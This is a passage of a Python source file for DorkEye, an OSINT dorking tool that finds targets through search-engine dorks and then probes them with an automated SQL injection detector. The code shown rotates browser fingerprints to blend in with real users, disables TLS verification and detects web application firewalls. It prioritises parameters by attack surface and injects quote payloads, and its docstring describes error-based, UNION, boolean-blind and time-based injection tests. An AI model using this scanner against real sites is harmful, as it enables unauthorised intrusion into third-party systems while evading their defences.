#!/usr/bin/env python3
"""
DorkEye v4.8 | OSINT Dorking Tool
Author: xPloits3c I.C.W.T| https://github.com/xPloits3c/DorkEye
"""

import os
import sys
import time
import json
import yaml
import random
import argparse
import hashlib
import difflib
import csv
import re
import signal
import statistics
import queue
import threading
from datetime import datetime
from pathlib import Path
from typing import List, Dict, Set, Tuple, Optional
from urllib.parse import urlparse, unquote, parse_qs, urlencode, quote
from collections import defaultdict
from dataclasses import dataclass
from enum import Enum
from html.parser import HTMLParser as _HTMLParser   # FIX: needed for script-tag stripping

import requests
import urllib3
from requests.adapters import HTTPAdapter
from dork_generator import DorkGenerator
from urllib3.util.retry import Retry

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ── Agents — integrated post-search analysis pipeline (autonomous, no external AI) ──
try:
    from dorkeye_agents import (
        run_analysis_pipeline as _run_agents_pipeline,
        add_crawler_args,
        run_crawl,
        TriageAgent,
        PageFetchAgent,
        SecretsAgent,
        ReportAgent,
        DorkCrawlerAgent,
    )
    _ANALYZE_AVAILABLE = True
except ImportError:
    _ANALYZE_AVAILABLE = False
    def _run_agents_pipeline(*a, **kw):  # type: ignore[misc]
        """Fallback stub: run the full post-search agents pipeline (triage, fetch, secrets, report)."""
        return {"triaged": None, "all_secrets": [], "report_path": None}
    def add_crawler_args(parser):        # type: ignore[misc]
        """Fallback stub: register --crawl-* CLI arguments onto the given argparse parser."""
        return parser
    def run_crawl(*a, **kw):             # type: ignore[misc]
        """Fallback stub: run the DorkCrawlerAgent and return a summary dict."""
        return {"results": [], "rounds": 0, "stop_reason": "unavailable"}
from rich.console import Console
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.table import Table
from rich.panel import Panel
from rich.markup import escape as _rich_escape
from ddgs import DDGS
import socket
import getpass

console = Console()

VALID_MODES = ["soft", "medium", "aggressive"]

# ══════════════════════════════════════════════════════════════
#  [7] Termux / Android auto-detection
# ══════════════════════════════════════════════════════════════

def _detect_termux_android() -> bool:
    """Return True when running inside Termux on Android."""
    return (
        "TERMUX_VERSION" in os.environ
        or os.environ.get("PREFIX", "").startswith("/data/data/com.termux")
        or os.path.isdir("/data/data/com.termux")
    )

TERMUX_IS_ANDROID: bool = _detect_termux_android()

# ══════════════════════════════════════════════════════════════
#  Ctrl+C interrupt state
# ══════════════════════════════════════════════════════════════

_last_interrupt_time: float = 0.0
_skip_current: bool         = False
_exit_requested: bool       = False


def _sigint_handler(signum, frame):
    """Handle SIGINT (Ctrl+C). Single press skips the current task; double press within 1.5 s exits."""
    global _last_interrupt_time, _skip_current, _exit_requested
    now = time.monotonic()
    if now - _last_interrupt_time < 1.5:
        _exit_requested = True
        sys.stderr.write("\n[!!] Double Ctrl+C detected — exiting...\n")
        sys.stderr.flush()
    else:
        _skip_current = True
        sys.stderr.write("\n[~] Ctrl+C — skipping current task...\n")
        sys.stderr.flush()
    _last_interrupt_time = now


signal.signal(signal.SIGINT, _sigint_handler)


def _interruptible_sleep(seconds: float, step: float = 0.25) -> None:
    """Sleep in small steps; return immediately if skip/exit is flagged."""
    elapsed = 0.0
    while elapsed < seconds:
        if _exit_requested or _skip_current:
            return
        time.sleep(min(step, seconds - elapsed))
        elapsed += step


def print_banner():
    """Print the ASCII art banner, version info, and legal disclaimer to the terminal."""
    TITLE_ROWS = [
        ("bold bright_blue", "╔╦╗╔═╗╦═╗╦╔═  ╔═╗╦ ╦╔═╗"),
        ("bold blue",        " ║║║ ║╠╦╝╠╩╗  ║╣ ╚╦╝║╣"),
        ("bold blue",        "═╩╝╚═╝╩╚═╩ ╩  ╚═╝ ╩ ╚═╝"),
    ]
    for style, row in TITLE_ROWS:
        console.print(f"[{style}]{row}[/{style}]")
    console.print()

    SYRINGE = (
        "[bold yellow] ___[/bold yellow]\n"
        "[bold yellow]__H__[/bold yellow]\n"
        "[bold yellow] [[/bold yellow][bold red]d[/bold red][bold yellow]][/bold yellow]\n"
        "[bold yellow] [[/bold yellow][bold red]e[/bold red][bold yellow]][/bold yellow]\n"
        "[bold yellow] [[/bold yellow][bold red];[/bold red][bold yellow]][/bold yellow]\n"
        "[bold yellow] |_|[/bold yellow]\n"
        "[bold yellow]  V[/bold yellow]"
    )

    android_badge = (
        "\n[bold yellow]▸ Platform[/bold yellow] [dim]│[/dim]  "
        "[bold green]Android / Termux  ⚡ battery-saver active[/bold green]"
        if TERMUX_IS_ANDROID else ""
    )

    INFO = (
        "[bold white]OSINT DORKING TOOL[/bold white]\n"
        "[bold green]v4.8[/bold green]  [dim]stable[/dim]\n"
        "\n"
        "[dim]▸ Author[/dim]  [dim]│[/dim]  [cyan]xPloits3c I.C.W.T[/cyan]\n"
        "[dim]▸ GitHub[/dim]  [dim]│[/dim]  [cyan]github.com/xPloits3c/DorkEye[/cyan]\n"
        "[dim]▸ Site  [/dim]  [dim]│[/dim]  [cyan]xploits3c.github.io/DorkEye[/cyan]\n"
        "\n"
        "[dim]▸ Engine[/dim]  [dim]│[/dim]  [green]DuckDuckGo[/green]\n"
        "[dim]▸ SQLi  [/dim]  [dim]│[/dim]  [green]Real detection[/green]\n"
        "[dim]▸ Stealth[/dim] [dim]│[/dim]  [green]HTTP fingerprinting[/green]\n"
        "[dim]▸ Analyzer[/dim][dim]│[/dim]  [green]Extract metadata[/green]"
        + android_badge
    )

    grid = Table.grid(padding=(0, 6))
    grid.add_column(min_width=10)
    grid.add_column()
    grid.add_row(SYRINGE, INFO)
    console.print(grid)
    console.print()

    console.print(Panel(
        "[bold red]⚠  Legal disclaimer[/bold red]\n"
        "[dim]Attacking targets without prior mutual consent is illegal.[/dim]\n"
        "[dim]It is the end user's responsibility to obey all applicable local, state and federal laws.[/dim]",
        border_style="red",
        padding=(0, 2),
    ))
    console.print()


WELCOME_MESSAGES = [
    "Stay safe, {name}.",
    "Session initialized, {name}.",
    "Connected. Welcome back, {name}.",
    "Terminal ready, {name}.",
    "OSINT mode active, {name}.",
    "Curiosity leaves footprints.",
    "VPN is not invisibility.",
    "They log more than you think.",
    "Silence. Just data, {name}.",
    "Back online, {name}.",
    "Workspace loaded, {name}.",
    "Use isolated environments.",
    "Targets waiting, {name}.",
    "Query the noise, {name}.",
    "Burn what you touch.",
    "You are visible.",
    "No small talk. Just results, {name}.",
    "We don't break things. We observe, {name}.",
    "Information wants to be found, {name}.",
    "Trust nothing. Verify everything, {name}.",
    "Stay invisible, {name}.",
    "Let's see what they forgot to hide, {name}.",
]

WELCOME_COLORS = [
    "green", "bright_green", "yellow", "bright_yellow",
    "magenta", "bright_magenta", "blue", "bright_blue",
    "red", "bright_red", "white",
]


def get_user_name() -> str:
    """Return the current OS username; fall back to hostname, then "friend"."""
    try:
        return getpass.getuser()
    except Exception:
        try:
            return socket.gethostname()
        except Exception:
            return "friend"


def greet_user():
    """Print a random welcome message with a random colour using the OS username."""
    name    = _rich_escape(get_user_name())
    message = random.choice(WELCOME_MESSAGES).format(name=name)
    color   = random.choice(WELCOME_COLORS)
    console.print(f"[bold {color}]{message}[/bold {color}]\n")


# ══════════════════════════════════════════════════════════════
#  Enums / Dataclasses
# ══════════════════════════════════════════════════════════════

class SQLiConfidence(Enum):
    """Confidence levels for SQL injection findings (none → low → medium → high → critical)."""
    NONE     = "none"
    LOW      = "low"
    MEDIUM   = "medium"
    HIGH     = "high"
    CRITICAL = "critical"


@dataclass
class HTTPFingerprint:
    """Immutable snapshot of a browser HTTP fingerprint used to build realistic request headers."""
    browser:         str
    os:              str
    user_agent:      str
    accept_language: str
    accept_encoding: str
    accept:          str
    referer:         str
    sec_fetch_dest:  str
    sec_fetch_mode:  str
    sec_fetch_site:  str
    cache_control:   str


# ══════════════════════════════════════════════════════════════
#  HTTP Fingerprinting
# ══════════════════════════════════════════════════════════════

def load_http_fingerprints() -> Dict:
    """Load http_fingerprints.json and return a dict tagged with _mode (legacy | advanced | disabled)."""
    fingerprint_file = Path(__file__).parent / "http_fingerprints.json"
    try:
        with open(fingerprint_file, "r", encoding="utf-8") as f:
            data = json.load(f)
        if not isinstance(data, dict) or not data:
            raise ValueError("Fingerprint file is empty or invalid")
        if "fingerprints" in data:
            return {
                "_mode":             "advanced",
                "_meta":             data.get("_meta", {}),
                "fingerprints":      data.get("fingerprints", {}),
                "language_profiles": data.get("language_profiles", {}),
                "common_headers":    data.get("common_headers", {})
            }
        return {"_mode": "legacy", "fingerprints": data}
    except Exception as e:
        console.print(f"[yellow][!] Failed to load HTTP fingerprints: {e}[/yellow]")
        console.print("[yellow][!] HTTP fingerprinting will be disabled[/yellow]")
        return {"_mode": "disabled"}


def resolve_reference(value: str, common_headers: Dict) -> str:
    """Resolve a @reference token to its value in common_headers, or return value unchanged."""
    if isinstance(value, str) and value.startswith("@"):
        key = value[1:]
        return common_headers.get(key, "")
    return value


def resolve_accept_language(fp_headers: Dict, language_profiles: Dict) -> str:
    """Pick a random language profile from fp_headers and return the matching Accept-Language string."""
    profiles = fp_headers.get("accept_language_profiles")
    if not profiles:
        return ""
    profile = random.choice(profiles)
    return language_profiles.get(profile, "")


USER_AGENTS = {
    "chrome": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ],
    "firefox": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0"
    ],
    "safari": [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
    ],
    "edge": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0"
    ]
}

DEFAULT_CONFIG = {
    "extensions": {
        "documents":   [".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".ods"],
        "archives":    [".zip", ".rar", ".tar", ".gz", ".7z", ".bz2"],
        "databases":   [".sql", ".db", ".sqlite", ".mdb"],
        "backups":     [".bak", ".backup", ".old", ".tmp"],
        "configs":     [".conf", ".config", ".ini", ".yaml", ".yml", ".json", ".xml"],
        "scripts":     [".php", ".asp", ".aspx", ".jsp", ".sh", ".bat", ".ps1"],
        "credentials": [".env", ".git", ".svn", ".htpasswd"]
    },
    "blacklist":            [],
    "whitelist":            [],
    "analyze_files":        True,
    "max_file_size_check":  52428800,
    "sqli_detection":       False,
    "stealth_mode":         False,
    "user_agent_rotation":  True,
    "http_fingerprinting":  True,
    "request_timeout":      10,
    "max_retries":          3,
    "extended_delay_every_n_results": 100,
}


# ══════════════════════════════════════════════════════════════
#  HTTPFingerprintRotator
# ══════════════════════════════════════════════════════════════

class HTTPFingerprintRotator:
    """
Rotates browser fingerprint profiles on every request to make traffic look like real users.

    Supports two JSON schema modes:
      legacy   — flat dict of fingerprint objects
      advanced — shared header references + language profiles

"""
    def __init__(self):
        """Load raw fingerprints from JSON and build the fingerprint list."""
        self.raw_fingerprints    = load_http_fingerprints()
        self.fingerprints        = self._build_fingerprints()
        self.current_index       = 0
        self.current_fingerprint = None

    def _build_fingerprints(self) -> List[HTTPFingerprint]:
        """Parse raw fingerprint data into a list of HTTPFingerprint dataclass instances."""
        fingerprints: List[HTTPFingerprint] = []
        mode = self.raw_fingerprints.get("_mode")

        if mode == "legacy":
            for fp_data in self.raw_fingerprints.get("fingerprints", {}).values():
                try:
                    fingerprints.append(HTTPFingerprint(
                        browser         = fp_data["browser"],
                        os              = fp_data["os"],
                        user_agent      = fp_data["user_agent"],
                        accept_language = fp_data["accept_language"],
                        accept_encoding = fp_data["accept_encoding"],
                        accept          = fp_data["accept"],
                        referer         = "",
                        sec_fetch_dest  = fp_data["sec_fetch_dest"],
                        sec_fetch_mode  = fp_data["sec_fetch_mode"],
                        sec_fetch_site  = fp_data["sec_fetch_site"],
                        cache_control   = fp_data["cache_control"],
                    ))
                except KeyError:
                    continue
            return fingerprints

        if mode == "advanced":
            language_profiles = self.raw_fingerprints.get("language_profiles", {})
            common_headers    = self.raw_fingerprints.get("common_headers", {})
            fps               = self.raw_fingerprints.get("fingerprints", {})
            for fp in fps.values():
                try:
                    headers   = fp.get("headers", {})
                    sec_fetch = headers.get("sec_fetch", {})
                    fingerprints.append(HTTPFingerprint(
                        browser         = fp.get("browser", ""),
                        os              = fp.get("os", ""),
                        user_agent      = fp.get("user_agent", ""),
                        accept_language = resolve_accept_language(headers, language_profiles),
                        accept_encoding = resolve_reference(headers.get("accept_encoding", ""), common_headers),
                        accept          = resolve_reference(headers.get("accept", ""), common_headers),
                        referer         = "",
                        sec_fetch_dest  = sec_fetch.get("dest", "document"),
                        sec_fetch_mode  = sec_fetch.get("mode", "navigate"),
                        sec_fetch_site  = sec_fetch.get("site", "none"),
                        cache_control   = resolve_reference(headers.get("cache_control", ""), common_headers),
                    ))
                except Exception:
                    continue

        return fingerprints

    def get_random(self) -> Optional[HTTPFingerprint]:
        """Select and store a random fingerprint from the pool; return it."""
        self.current_fingerprint = random.choice(self.fingerprints) if self.fingerprints else None
        return self.current_fingerprint

    def get_next(self) -> Optional[HTTPFingerprint]:
        """Select and store the next fingerprint in round-robin order; return it."""
        if not self.fingerprints:
            return None
        self.current_fingerprint = self.fingerprints[self.current_index]
        self.current_index       = (self.current_index + 1) % len(self.fingerprints)
        return self.current_fingerprint

    def build_headers(self, referer: str = "") -> Dict[str, str]:
        """Build and return an HTTP headers dict from the current fingerprint. Adds Referer if provided."""
        if not self.current_fingerprint:
            return {"User-Agent": "Mozilla/5.0", "Accept": "*/*", "Connection": "keep-alive"}
        headers = {
            "User-Agent":                self.current_fingerprint.user_agent,
            "Accept":                    self.current_fingerprint.accept,
            "Accept-Language":           self.current_fingerprint.accept_language,
            "Accept-Encoding":           self.current_fingerprint.accept_encoding,
            "Sec-Fetch-Dest":            self.current_fingerprint.sec_fetch_dest,
            "Sec-Fetch-Mode":            self.current_fingerprint.sec_fetch_mode,
            "Sec-Fetch-Site":            self.current_fingerprint.sec_fetch_site,
            "Cache-Control":             self.current_fingerprint.cache_control,
            "Pragma":                    "no-cache",
            "DNT":                       "1",
            "Connection":                "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }
        if referer:
            headers["Referer"] = referer
        return headers


# ══════════════════════════════════════════════════════════════
#  CircuitBreaker
# ══════════════════════════════════════════════════════════════

class CircuitBreaker:
    """Tracks unreachable hosts and short-circuits further requests to them within a session."""
    def __init__(self):
        """Initialise with an empty dead-host set."""
        self._dead: Set[str] = set()

    def _key(self, url: str) -> str:
        """Return the scheme+netloc key for the given URL (host-level granularity)."""
        p = urlparse(url)
        return f"{p.scheme}://{p.netloc}"

    def is_dead(self, url: str) -> bool:
        """Return True if the host of url has been marked dead."""
        return self._key(url) in self._dead

    def mark_dead(self, url: str) -> None:
        """Mark the host of url as dead so future requests are skipped immediately."""
        self._dead.add(self._key(url))

    def reset(self) -> None:
        """Clear the dead-host set, re-enabling all hosts."""
        self._dead.clear()


# ══════════════════════════════════════════════════════════════
#  SQLiDetector — constants
# ══════════════════════════════════════════════════════════════

_CONNECT_TIMEOUT  = 3 if TERMUX_IS_ANDROID else 4
_DEFAULT_READ     = 6 if TERMUX_IS_ANDROID else 8
_TIMEBASED_MARGIN = 2.5
_SLEEP_DELAY      = 3
_BASELINE_SAMPLES = 1 if TERMUX_IS_ANDROID else 2
_MAX_BASELINE_S   = 6.0

_PROBE_SAMPLES       = 2 if TERMUX_IS_ANDROID else 3
_PROBE_NOISE_BUFFER  = 0.04
_PROBE_MAX_THRESHOLD = 0.18
_BOOL_SAMPLES        = 2 if TERMUX_IS_ANDROID else 3
_TIMEBASED_CONFIRM   = 1 if TERMUX_IS_ANDROID else 2
_UNION_COLUMNS_MAX   = 5


# ══════════════════════════════════════════════════════════════
#  FIX: HTMLParser-based script-tag stripper
#
#  The original code used a regex to strip <script> blocks before
#  scanning response bodies for SQL error signatures:
#
#    _SCRIPT_TAG_RE = re.compile(r"<script[\s\S]*?</script\s*>", re.IGNORECASE)
#
#  CodeQL flagged this as CWE-20/116/185/186 ("Bad HTML filtering
#  regexp") because the pattern does not match all syntactically
#  valid closing tags that browsers accept (e.g. </script\t\n bar>,
#  or </SCRIPT  >), making it bypassable.
#
#  Fix: use Python's built-in HTMLParser.  The regex is kept only as
#  a last-resort fallback for documents so malformed that the parser
#  itself raises an exception.
# ══════════════════════════════════════════════════════════════

class _ScriptStripper(_HTMLParser):
    """HTMLParser subclass that removes every <script>…</script> block."""

    def __init__(self):
        """Initialise state: script depth counter and text-part accumulator."""
        super().__init__(convert_charrefs=False)
        self._in_script: int = 0   # counter handles (unusual) nested script tags
        self._parts: list   = []

    def handle_starttag(self, tag, attrs):
        """Increment the nesting counter when a <script> opening tag is encountered."""
        if tag.lower() == "script":
            self._in_script += 1

    def handle_endtag(self, tag):
        """Decrement the nesting counter when a </script> closing tag is encountered."""
        if tag.lower() == "script" and self._in_script:
            self._in_script -= 1

    def handle_data(self, data):
        """Append text to the result only when not inside a <script> block."""
        if not self._in_script:
            self._parts.append(data)

    def handle_entityref(self, name):
        """Append HTML entity references (&name;) when not inside a <script> block."""
        if not self._in_script:
            self._parts.append(f"&{name};")

    def handle_charref(self, name):
        """Append numeric character references (&#N;) when not inside a <script> block."""
        if not self._in_script:
            self._parts.append(f"&#{name};")

    def get_result(self) -> str:
        """Return the accumulated clean text with all <script> blocks removed."""
        return "".join(self._parts)


# Fallback-only regex (used when the HTML parser itself raises an exception).
# NOTE: this regex is intentionally NOT used as the primary path.
_SCRIPT_TAG_RE_FALLBACK = re.compile(
    r"<script(?:[^>]*)>[\s\S]*?</script\s*>", re.IGNORECASE
)


def _strip_script_tags(body: str) -> str:
    """Return *body* with all <script> blocks removed.

    Uses the built-in HTMLParser as the primary implementation to
    correctly handle all valid (and many invalid) HTML closing-tag
    variants that a regex cannot reliably cover.
    """
    stripper = _ScriptStripper()
    try:
        stripper.feed(body)
        stripper.close()
        return stripper.get_result()
    except Exception:
        # Malformed HTML that breaks the parser — fall back to regex
        return _SCRIPT_TAG_RE_FALLBACK.sub("", body)


# ══════════════════════════════════════════════════════════════
#  [4] WAF detection signatures
# ══════════════════════════════════════════════════════════════

WAF_SIGNATURES: Dict[str, List[str]] = {
    "cloudflare":  ["cf-ray", "__cfduid", "cloudflare", "attention required! | cloudflare"],
    "modsecurity": ["mod_security", "modsecurity", "406 not acceptable", "not acceptable!"],
    "wordfence":   ["wordfence", "generated by wordfence"],
    "sucuri":      ["x-sucuri-id", "sucuri website firewall", "access denied - sucuri"],
    "imperva":     ["x-iinfo", "incapsula incident", "_incap_ses_"],
    "akamai":      ["akamai", "x-akamai-transformed", "reference #18"],
    "f5_bigip":    ["x-waf-event-info", "bigipserver", "the requested url was rejected"],
    "barracuda":   ["barra_counter_session", "barracuda"],
    "fortiweb":    ["fortigate", "fortiweb"],
    "aws_waf":     ["x-amzn-requestid", "awselb", "forbidden - aws waf"],
    "denyall":     ["denyall", "x-denyall"],
    "reblaze":     ["x-reblaze-protection"],
}

# ══════════════════════════════════════════════════════════════
#  [6] Parameter priority tables
# ══════════════════════════════════════════════════════════════

_HIGH_PRIORITY_PARAMS: frozenset = frozenset({
    "id", "pid", "uid", "nid", "tid", "cid", "rid", "eid", "fid", "gid",
    "page", "pg", "p", "num", "item", "product", "prod", "article",
    "cat", "category", "sort", "order", "by", "type", "idx", "index",
    "ref", "record", "row", "entry", "post", "news", "view",
})

_MEDIUM_PRIORITY_PARAMS: frozenset = frozenset({
    "search", "q", "query", "s", "keyword", "kw", "term", "find",
    "name", "user", "username", "login", "email", "mail",
    "city", "country", "region", "lang", "language",
    "filter", "tag", "label", "topic", "subject", "section",
})


# ══════════════════════════════════════════════════════════════
#  SQLiDetector
# ══════════════════════════════════════════════════════════════

class SQLiDetector:

    """
    Multi-method SQL injection detector that tests GET/POST/JSON/path parameters.

        Detection methods (run in order per parameter):
          1. error_based    — injects payloads that trigger DB error signatures
          2. union_based     — probes column count and detects UNION response anomalies
          3. boolean_blind   — compares response sizes for true/false condition pairs
          4. time_based_blind — measures SLEEP()-induced response delays

        Parameters are prioritised by attack surface before testing:
          high   — numeric values or known high-risk names (id, page, cat, …)
          medium — search/filter names (q, search, lang, …)
          low    — everything else

        A CircuitBreaker skips further requests to hosts that became unreachable.

    """
    SQL_ERROR_SIGNATURES = {
        "mysql": [
            r"You have an error in your SQL syntax",
            r"Warning.*mysqli?_",
            r"MySQLSyntaxErrorException",
            r"valid MySQL result",
            r"mysql_num_rows\(\)",
            r"mysql_fetch_(?:array|assoc|row|object)",
            r"MySQL server version for the right syntax",
            r"com\.mysql\.jdbc\.exceptions",
        ],
        "postgresql": [
            r"PostgreSQL.*ERROR",
            r"Warning.*\bpg_",
            r"valid PostgreSQL result",
            r"Npgsql\.",
            r"org\.postgresql\.util\.PSQLException",
            r"ERROR:\s+syntax error at or near",
            r"ERROR:\s+unterminated quoted string",
        ],
        "mssql": [
            r"Driver.*SQL[\-\_\ ]*Server",
            r"OLE DB.*SQL Server",
            r"SQLServer JDBC Driver",
            r"Microsoft SQL Native Client error",
            r"ODBC SQL Server Driver",
            r"Unclosed quotation mark after the character string",
            r"Microsoft OLE DB Provider for SQL Server",
            r"\[Microsoft\]\[ODBC SQL Server Driver\]",
            r"Incorrect syntax near",
        ],
        "sqlite": [
            r"SQLite/JDBCDriver",
            r"SQLite\.Exception",
            r"System\.Data\.SQLite\.SQLiteException",
            r"sqlite3\.OperationalError:",
            r"near \".*\": syntax error",
        ],
        "oracle": [
            r"Oracle error",
            r"Oracle.*Driver",
            r"Warning.*\boci_",
            r"ORA-\d{5}",
            r"oracle\.jdbc\.driver",
            r"quoted string not properly terminated",
        ],
    }

    _UNION_COL_MISMATCH_RE = re.compile(
        r"(The used SELECT statements have a different number of columns"
        r"|each UNION query must have the same number of columns"
        r"|SELECTs to the left and right of UNION do not have the same number"
        r"|ORA-01789"
        r"|column count doesn.t match)",
        re.IGNORECASE,
    )

    def __init__(self, stealth: bool = False, timeout: int = _DEFAULT_READ):
        """Initialise the detector with stealth flag, timeout, fingerprint rotator, and circuit breaker."""
        self.stealth             = stealth
        self.read_timeout        = timeout
        self.circuit_breaker     = CircuitBreaker()
        self.fingerprint_rotator = HTTPFingerprintRotator()
        self._session            = self._build_session()

    def _build_session(self) -> requests.Session:
        """Build and return a requests.Session with a retry adapter (backoff on 429/5xx)."""
        session = requests.Session()
        retry   = Retry(
            total            = 2,
            backoff_factor   = 0.5,
            status_forcelist = [429, 500, 502, 503, 504],
            allowed_methods  = ["GET"],
            raise_on_status  = False,
        )
        adapter = HTTPAdapter(max_retries=retry)
        session.mount("http://",  adapter)
        session.mount("https://", adapter)
        return session

    def _timeout(self, extra_read: float = 0) -> Tuple[int, float]:
        """Return a (connect_timeout, read_timeout + extra_read) tuple for use in requests calls."""
        return (_CONNECT_TIMEOUT, self.read_timeout + extra_read)

    def _run_interruptible(self, fn, total_timeout: float, on_connect_error=None):
        """
    Run fn() in a daemon thread; return its result or None on timeout or interrupt.

            Args:
                fn:               Zero-argument callable that performs the HTTP request.
                total_timeout:    Wall-clock deadline in seconds.
                on_connect_error: Optional callback invoked when a connection-level exception fires.

    """
        _POLL = 0.1
        result_holder = [None]
        exc_holder    = [None]
        done_event    = threading.Event()

        def _worker():
            """Worker thread: call fn() and store result or exception, then set done_event."""
            try:
                result_holder[0] = fn()
            except (requests.exceptions.ConnectTimeout,
                    requests.exceptions.ConnectionError) as e:
                exc_holder[0] = e
            except Exception:
                pass
            finally:
                done_event.set()

        threading.Thread(target=_worker, daemon=True).start()

        deadline = total_timeout + 1.0
        elapsed  = 0.0
        while elapsed < deadline:
            if _exit_requested or _skip_current:
                return None
            if done_event.wait(timeout=_POLL):
                if exc_holder[0] is not None and on_connect_error:
                    on_connect_error()
                return result_holder[0]
            elapsed += _POLL

        return None

    def _get(self, url: str, extra_read: float = 0) -> Optional[requests.Response]:
        """Perform a GET request with the current fingerprint; return the Response or None on failure."""
        if self.circuit_breaker.is_dead(url):
            return None

        self.fingerprint_rotator.get_random()
        headers = self.fingerprint_rotator.build_headers()
        timeout = self._timeout(extra_read)

        def _do():
            """Execute the actual requests.get call inside the worker thread."""
            return self._session.get(
                url,
                headers         = headers,
                timeout         = timeout,
                verify          = False,
                allow_redirects = True,
            )

        total = _CONNECT_TIMEOUT + self.read_timeout + extra_read

        return self._run_interruptible(
            _do,
            total_timeout    = total,
            on_connect_error = lambda: self.circuit_breaker.mark_dead(url),
        )

    # ──────────────────────────────────────────────────────────
    #  [4] WAF Detection
    # ──────────────────────────────────────────────────────────

    def _detect_waf(self, response: requests.Response) -> Optional[str]:
        """Scan response headers and body for known WAF signatures; return the WAF name or None."""
        headers_keys   = {k.lower() for k in response.headers}
        headers_values = " ".join(v.lower() for v in response.headers.values())
        body_snippet   = response.text[:2000].lower()

        for waf_name, sigs in WAF_SIGNATURES.items():
            for sig in sigs:
                if sig in headers_keys or sig in headers_values or sig in body_snippet:
                    return waf_name

        if response.status_code in (403, 406, 419, 429) and len(response.text) < 600:
            return "generic_waf"

        return None

    def _measure_baseline_latency(self, url: str) -> Optional[float]:
        """Measure average response latency over _BASELINE_SAMPLES requests; return it or None."""
        times = []
        for _ in range(_BASELINE_SAMPLES):
            if self.circuit_breaker.is_dead(url):
                return None
            if _exit_requested or _skip_current:
                return None
            t0       = time.monotonic()
            response = self._get(url)
            elapsed  = time.monotonic() - t0
            if response is None:
                return None
            times.append(elapsed)
            _interruptible_sleep(0.3)
        baseline = sum(times) / len(times)
        if baseline > _MAX_BASELINE_S:
            return None
        return baseline

    def has_query_params(self, url: str) -> bool:
        """Return True if the URL contains at least one GET query parameter."""
        try:
            return bool(parse_qs(urlparse(url).query))
        except Exception:
            return False

    def _extract_query_params(self, url: str) -> Dict[str, str]:
        """Parse and return all GET query parameters as a flat {name: first_value} dict."""
        try:
            params = parse_qs(urlparse(url).query)
            return {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
        except Exception:
            return {}

    def _inject_payload(self, url: str, param_name: str, payload: str) -> str:
        """Return a copy of url with param_name replaced by payload. Preserves the URL fragment."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if param_name not in params:
            return url
        params[param_name] = [payload]
        new_query = urlencode(params, doseq=True)
        rebuilt = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
        if parsed.fragment:
            rebuilt += f"#{parsed.fragment}"
        return rebuilt

    def _get_baseline_response(self, url: str) -> Optional[Tuple[int, str, int]]:
        """Fetch the baseline response for url; return (status_code, body_text, body_len) or None."""
        response = self._get(url)
        if response is None:
            return None
        return (response.status_code, response.text, len(response.text))

    def _match_sql_errors(self, body: str) -> Optional[Tuple[str, str]]:
        """Strip <script> blocks then scan the body for SQL error signatures; return (db, pattern) or None."""
        # Use HTMLParser-based stripper instead of the bypassed regex (CWE-20/116/185/186 fix)
        clean_body = _strip_script_tags(body)
        for db_type, patterns in self.SQL_ERROR_SIGNATURES.items():
            for pattern in patterns:
                if re.search(pattern, clean_body, re.IGNORECASE):
                    return (db_type, pattern)
        return None

    # ──────────────────────────────────────────────────────────
    #  [6] Parameter prioritisation
    # ──────────────────────────────────────────────────────────

    def _prioritize_params(self, params: Dict[str, str]) -> List[str]:
        """Sort params into high / medium / low priority lists and return them concatenated."""
        high: List[str] = []
        medium: List[str] = []
        low: List[str] = []

        for param, value in params.items():
            p_lower = param.lower()
            if value.isdigit() or p_lower in _HIGH_PRIORITY_PARAMS:
                high.append(param)
            elif p_lower in _MEDIUM_PRIORITY_PARAMS:
                medium.append(param)
            else:
                low.append(param)

        return high + medium + low

    def _probe_parameter(self, url: str, param_name: str, baseline_content: str) -> bool:
        """
    Return True if the parameter shows meaningful response variation when injected with a quote.

            Measures natural noise first, then checks whether the 1-quote payload pushes the
            response delta above the adaptive threshold derived from that noise.

    """
        if self.circuit_breaker.is_dead(url):
            return False

        r_init = self._get(url)
        if r_init is None:
            return False
        baseline_status: int = r_init.status_code
        first_sim            = difflib.SequenceMatcher(None, baseline_content, r_init.text).ratio()
        noise_samples: List[float] = [1.0 - first_sim]

        for _ in range(_PROBE_SAMPLES - 1):
            if _exit_requested or _skip_current:
                return False
            r = self._get(url)
            if r is None:
                return False
            sim = difflib.SequenceMatcher(None, baseline_content, r.text).ratio()
            noise_samples.append(1.0 - sim)
            _interruptible_sleep(0.2)

        noise_level = statistics.median(noise_samples)

        if noise_level > _PROBE_MAX_THRESHOLD:
            return False

        adaptive_threshold = noise_level + _PROBE_NOISE_BUFFER

        if _exit_requested or _skip_current:
            return False

        test_url  = self._inject_payload(url, param_name, "1'")
        r_payload = self._get(test_url)
        if r_payload is None:
            return False

        if r_payload.status_code != baseline_status:
            return False

        payload_noise = 1.0 - difflib.SequenceMatcher(
            None, baseline_content, r_payload.text
        ).ratio()

        return payload_noise > adaptive_threshold

    def _test_error_based(self, url: str, param_name: str) -> Dict:
